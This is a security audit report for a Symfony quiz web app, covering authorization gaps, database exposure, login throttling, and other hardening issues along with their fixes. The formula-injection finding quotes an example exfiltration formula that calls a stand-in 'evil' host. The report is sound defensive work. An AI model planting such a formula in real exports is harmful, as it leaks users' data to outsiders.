# Security Audit — Tijd voor de test

**Date:** 2026-07-12
**Branch:** `declare-ext-intl-ext-zip`
**Scope:** Full codebase — authentication/authorization, injection & output encoding, config/secrets/infrastructure, quiz business-logic abuse, and dependency audits. Read-only scan; no files were modified.

## Summary

| #  | Severity | Finding                                                                            | Location                                                                      |
|----|----------|------------------------------------------------------------------------------------|-------------------------------------------------------------------------------|
| 1  | High     | ~~`PrepareEliminationController` has no authorization guard~~ **Fixed 2026-07-13** | `src/Controller/Backoffice/PrepareEliminationController.php:21-65`            |
| 2  | High     | Production PostgreSQL published to host + default-password fallback                | `compose.prod.yaml:27-28`, `compose.yaml:11,30`                               |
| 3  | Medium   | ~~Spreadsheet formula injection in exports~~ **Fixed 2026-07-13**                  | `src/Service/QuizSpreadsheetService.php`, `src/Service/DataExportService.php` |
| 4  | Medium   | ~~No login throttling / brute-force protection~~ **Fixed 2026-07-13**              | `config/packages/security.yaml:30-31`                                         |
| 5  | Medium   | Open self-registration grants immediate backoffice access                          | `src/Controller/RegistrationController.php:40-56`                             |
| 6  | Low      | ~~Double-submit race can inflate score~~ **Fixed 2026-07-13**                      | `src/Controller/QuizController.php:135-142`                                   |
| 7  | Low      | Answer-POST path never checks `isFinalized`/`isLocked`                             | `src/Controller/QuizController.php:102-131`                                   |
| 8  | Low      | Server-side formula evaluation of uploaded XLSX                                    | `src/Service/QuizSpreadsheetService.php:68`                                   |
| 9  | Low      | Containers run as root                                                             | `Dockerfile`                                                                  |
| 10 | Low      | No security response headers in prod                                               | `frankenphp/Caddyfile:45`                                                     |
| 11 | Low      | Committed `APP_SECRET` (dev-only)                                                  | `.env.dev:3`                                                                  |
| 12 | Low      | `zend.exception_ignore_args = Off` in prod                                         | `frankenphp/conf.d/10-app.ini:15`                                             |

**Dependencies are clean:** `composer audit` and `bin/console importmap:audit` both report zero known-CVE advisories.

---

## High

### 1. `PrepareEliminationController` has no authorization guard — FIXED

**File:** `src/Controller/Backoffice/PrepareEliminationController.php:21-65`

The class carried no `#[IsGranted]` at class or method level — unlike every sibling controller, and unlike `EliminationController` which guards with `SeasonVoter::ELIMINATION`. Both routes were gated only by the blanket `^/backoffice → IS_AUTHENTICATED` rule.

- `viewElimination` (line 46) both reads and, on POST, rewrites any elimination via `updateFromInputBag()` + `flush()`.
- `index` (line 32) never checked that `$quiz` belonged to `$season`.

**Failure scenario:** Any authenticated user who obtained or guessed another season's quiz/elimination UUID could rewrite that season's red/green elimination screens.

**Fix applied:** Added `#[IsGranted(SeasonVoter::ELIMINATION, 'quiz')]` to `index` and `#[IsGranted(SeasonVoter::ELIMINATION, 'elimination')]` to `viewElimination`, matching the pattern used everywhere else. Regression tests `testIndexIsDeniedForNonOwner` and `testViewEliminationIsDeniedForNonOwner` were added to `tests/Controller/Backoffice/PrepareEliminationControllerTest.php` (written first, confirmed failing against the old code, now passing). Full suite (290 tests), PHPStan, Rector, and CS-Fixer all pass.

### 2. Production PostgreSQL published to host with default-password fallback

**Files:** `compose.prod.yaml:27-28`, `compose.yaml:11,30`

- `compose.prod.yaml:27-28` published `5430:5432` in the *production* override; the DB should stay on the internal network only.
- `compose.yaml:11,30` default `POSTGRES_PASSWORD` to `!ChangeMe!`, and `compose.prod.yaml` never set it, so a deployment that omitted it silently ran with a publicly known password.

**Failure scenario:** Internet-reachable database with a known default credential → full read/write of user hashes, quiz data, reset-password tokens.

**Fix applied:** Dropped the port publish from the prod override, and `compose.prod.yaml` now requires `POSTGRES_PASSWORD` (`${POSTGRES_PASSWORD:?...}`) with no fallback.

---

## Medium

### 3. Spreadsheet formula injection in exports — FIXED

**Files:** `src/Service/QuizSpreadsheetService.php:132,136`; `src/Service/DataExportService.php:208,237,249-265,328,393-403`

All user-controlled strings were written to XLSX via `setCellValue()`/`fromArray()` with no quote-prefixing or value-binder override. PhpSpreadsheet stores any string starting with `=` as a live formula.

**Failure scenario:** Seasons support multiple owners, so a co-owner could name an answer/candidate `=WEBSERVICE("http://evil/?"&A1)`; when another owner opened the quiz export or GDPR zip in Excel, the formula would execute/exfiltrate.

**Fix applied:** Added `src/Helpers/FormulaInjectionSafeValueBinder.php`, a `DefaultValueBinder` override that forces any string starting with `= + - @` (or a leading tab/CR) to be stored as a plain string data type instead of being auto-detected as a formula. Wired it in via `Cell::setValueBinder()` in the constructors of `QuizSpreadsheetService` and `DataExportService`, so it's active before any cell is written. Regression tests added: `tests/Helpers/FormulaInjectionSafeValueBinderTest.php` (unit-level), plus `testQuizToXlsxStoresFormulaLikeAnswerTextAsPlainString` and `testRawAnswersSheetStoresFormulaLikeAnswerTextAsPlainString` (written first, confirmed failing against the old code, now passing).

### 4. No login throttling / brute-force protection — FIXED

**File:** `config/packages/security.yaml:30-31`

`form_login` had no `login_throttling` and no rate limiter was configured anywhere. `/login` allowed unlimited password guessing; the public `POST /` season-code entry (`QuizController.php:35`) was likewise an unthrottled oracle for enumerating the ~3.2M-space season codes (5 chars, 20-consonant alphabet).

**Fix applied:**
- Added `symfony/rate-limiter` as a composer dependency and enabled `login_throttling` (`max_attempts: 5`) on the `main` firewall in `config/packages/security.yaml`, using Symfony's built-in per-user/global rate limiter.
- Added a dedicated `season_code` rate limiter (`framework.rate_limiter`, sliding window, 20 attempts/minute per IP) in `config/packages/framework.yaml`, enforced in `QuizController::selectSeason` — a `TooManyRequestsHttpException` (429) is thrown once the client IP exceeds the limit, before the season-code form is even validated.
- Both limiters have lower `when@test` overrides so tests run fast and deterministically.
- Regression tests added: `testLoginIsThrottledAfterTooManyFailedAttempts` (`tests/Controller/LoginControllerTest.php`) and `testSelectSeasonIsThrottledAfterTooManyAttempts` (`tests/Controller/QuizControllerTest.php`), both written first, confirmed failing against the old config, now passing.

### 5. Open self-registration grants immediate backoffice access

**Files:** `src/Controller/RegistrationController.php:40-56`, `config/packages/security.yaml:31`

Registration auto-logs-in a new user *before* email verification, and `^/backoffice` requires only `IS_AUTHENTICATED`. Any anonymous visitor gets an authenticated foothold to probe every backoffice route — the precondition that makes finding 1 practically exploitable.

**Fix / decision needed:** Confirm whether open registration into the backoffice is intended. If so, gate sensitive areas behind verified email and add a CAPTCHA/rate limit to registration.

---

## Low

### 6. Double-submit race can inflate score — FIXED

**Files:** `src/Controller/QuizController.php:137-146`, `src/Entity/GivenAnswer.php`, `migrations/Version20260713194340.php`

No unique constraint on `GivenAnswer` and a TOCTOU between the "is this the next question" check and the insert. Concurrent POSTs of the known-correct answer could each pass the check before either committed, each inserting a `GivenAnswer` row — `QuizRepository::getScores()` counts every row where the answer is correct, so duplicates inflated the score.

**Fix applied:** Added a denormalized `GivenAnswer::$question` (derived from `$answer->question` in the constructor, no call-site changes needed) plus a Postgres partial unique index on `(candidate_id, question_id) WHERE deleted_at IS NULL`, matching the pattern already used on `QuizCandidate`. The partial predicate keeps re-answering possible after `GivenAnswerRepository::deleteAllForCandidateInQuiz()` soft-deletes a candidate's answers (backoffice "reset candidate progress"). `QuizController::quizPage` now catches `UniqueConstraintViolationException` on flush and redirects with a flash instead of a 500. Regression test `testDuplicateGivenAnswerForSameQuestionIsRejected` added to `tests/Repository/GivenAnswerRepositoryTest.php` (written first, confirmed failing against the old schema, now passing). Full suite (300 tests), PHPStan, Rector, and CS-Fixer all pass.

---

## Remaining Low findings

- **7. Answer-POST path never checks `isFinalized`/`isLocked`** (`src/Controller/QuizController.php:102-131`): a finalized quiz still set as `activeQuiz` stays answerable. The POST path also doesn't assert a `QuizCandidate` exists (only GET does) — currently not exploitable but worth hardening.
- **8. Server-side formula evaluation of uploaded XLSX** (`src/Service/QuizSpreadsheetService.php:68`): `toArray()` leaves `calculateFormulas` at default `true`, allowing CPU-burn via nested formulas on import. Pass `calculateFormulas: false`.
- **9. Containers run as root** (`Dockerfile`, no `USER` directive): any PHP RCE is immediately root in-container.
- **10. No security response headers in prod** (`frankenphp/Caddyfile:45`): no CSP/`frame-ancestors`, `X-Content-Type-Options`, or HSTS — backoffice is clickjackable.
- **11. Committed `APP_SECRET`** (`.env.dev:3`, dev-only): prod uses `composer dump-env prod` with an env-provided secret, so scope is limited to any environment misconfigured to `APP_ENV=dev`. Consider rotating regardless since the value is now public.
- **12. `zend.exception_ignore_args = Off`** (`frankenphp/conf.d/10-app.ini:15`, prod): a stack trace in a password-handling path could ship plaintext to Sentry.

---

## Confirmed clean

No SQL/DQL injection (all queries parameterized), essentially no XSS surface (one `|raw` on an app-generated signed URL; GitHub release markdown is escaped), no `unserialize`/`eval`/shell-exec anywhere, safe redirects (open-redirect listener validates the logout `target`), no correct-answer or score leakage to candidates, server-set timing (no client-forgeable timestamps), zip creation with sanitized filenames (no zip-slip/path traversal), and a clean CI workflow (least-privilege permissions, SHA-pinned actions, no `pull_request_target`).
